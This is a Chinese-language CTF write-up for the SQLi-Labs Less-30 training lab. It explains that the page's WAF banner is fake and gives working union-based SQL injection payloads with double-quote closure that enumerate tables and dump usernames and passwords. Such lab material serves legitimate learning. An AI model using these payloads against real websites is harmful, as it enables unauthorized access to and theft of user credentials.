【SQLi-Labs】Less-30 虚假防御与双引号联合查询 Writeup

操作者：何芊宏 | 操作日期：2026.10.27 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, 联合查询, 双引号闭合

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-30 (GET - Protection with WAF)
  • 提示：页面提示受防火墙保护，实际无过滤，双引号闭合。

2. 核心原理：黑盒测试与双引号闭合

本关卡与 Less-29 类似，页面仅展示静态的 "This Site Protected by World's Best WAF" 图片作为心理恐吓，实际上没有任何正则过滤或拦截机制。

两者的唯一区别在于后端 SQL 语句的结构。Less-29 是单引号 '$id'，而本关是双引号 "$id"。因此，在构造 Payload 时，必须使用双引号 " 进行闭合。由于无过滤，可以直接使用最基础的联合查询。

3. 操作步骤与解析

第一步：探测回显点

输入 URL：?id=-1" union select 1,2,3 --+

回显现象：页面显示数字 2 和 3，确认存在 3 列回显。

第二步：爆库名与表名

输入 URL：?id=-1" union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database() --+

回显现象：页面显示 security 以及表名 emails,referrers,uagents,users。

第三步：直接脱库提取数据

输入 URL：?id=-1" union select 1,group_concat(username),group_concat(password) from users --+

回显现象：页面直接渲染出所有用户账号和密码的拼接字符串，包含 admin:p@ssw0rd 等历史数据。

4. 踩坑记录与复盘

  • 视觉欺骗：不能仅凭页面上显示“WAF”或“安全防护”的字眼就放弃测试。真实的防御往往是无感知的，必须通过发包验证（如测试 `UNION SELECT` 是否被执行）。
  • 闭合符号的切换：在盲测时，如果单引号报错而双引号正常，必须立刻切换闭合符。

5. 知识点总结

  • 双引号注入：字符型注入的变种，需匹配后端 SQL 语句的包裹符号。
  • 信息收集与判断：通过底层回显的 QUERY_STRING 和实际报错，判断前端提示的真伪。
